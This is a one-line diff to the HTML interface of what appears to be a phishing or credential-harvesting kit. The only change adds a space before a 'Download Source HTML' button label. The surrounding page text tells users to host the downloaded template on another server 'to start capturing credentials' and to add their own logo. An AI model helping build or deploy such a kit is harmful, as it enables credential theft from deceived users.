@@ -529,7 +529,7 @@ body {
 </HEAD>
 <BODY><br><br><br>
 <FORM ACTION="<?php echo $templatename; ?>.zip" METHOD="GET">
-<button class="btn" style="width:100%" type="submit"><i class="fa fa-download"></i>Download Source HTML</button>
+<button class="btn" style="width:100%" type="submit"><i class="fa fa-download"></i> Download Source HTML</button>
 </FORM>
 <CENTER>
 <FONT COLOR="#FFFFFF">Extract contents into your web directory on another server to start capturing credentials!  Feel free to modify the source code to include your own logo/theme!</FONT>
